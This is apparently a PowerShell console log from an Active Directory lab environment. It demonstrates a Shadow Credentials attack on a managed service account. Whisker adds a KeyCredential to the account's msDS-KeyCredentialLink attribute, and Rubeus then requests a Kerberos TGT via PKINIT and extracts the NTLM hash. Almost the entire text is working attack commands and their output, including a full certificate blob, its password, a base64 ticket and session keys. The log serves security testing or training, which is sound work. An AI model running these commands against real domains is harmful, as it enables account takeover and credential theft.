PS C:\tools> .\Whisker.exe add /target:testMSA2$
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password AkMnmHTPPLYa0ZiR
[*] Searching for the target account
[*] Target user found: CN=testMSA2,OU=ShadowCreds2,OU=Misconfigs,DC=mindfreak,DC=lab,DC=lan
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID 6320953a-d0b9-4331-8c9a-9c39faeaa6ba
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:

Rubeus.exe asktgt /user:testMSA2$ /certificate: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 /password:"AkMnmHTPPLYa0ZiR" /domain:mindfreak.lab.lan /dc:CrissDC
01.mindfreak.lab.lan /getcredentials /show

PS C:\tools> .\Rubeus.exe asktgt /user:testMSA2$ /certificate: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 /password:"AkMnmHTPPLYa0ZiR" /domain:mindfreak.lab.lan /dc:CrissDC01.mindfreak.lab.lan /getcredentials /show

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.0 

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=testMSA2$ 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'mindfreak.lab.lan\testMSA2$'
[*] Using domain controller: 10.10.10.90:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      YWIubGFu

  ServiceName              :  krbtgt/mindfreak.lab.lan
  ServiceRealm             :  MINDFREAK.LAB.LAN
  UserName                 :  testMSA2$ (NT_PRINCIPAL)
  UserRealm                :  MINDFREAK.LAB.LAN
  StartTime                :  12/17/2025 9:05:10 AM
  EndTime                  :  12/17/2025 7:05:10 PM
  RenewTill                :  12/24/2025 9:05:10 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  MLzEw677qJgz5ZpNB9Tcxw==
  ASREP (key)              :  51E11F549641E3AAE7050E23B23DEEE2

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 00000000000000000000000000000000

PS C:\tools> 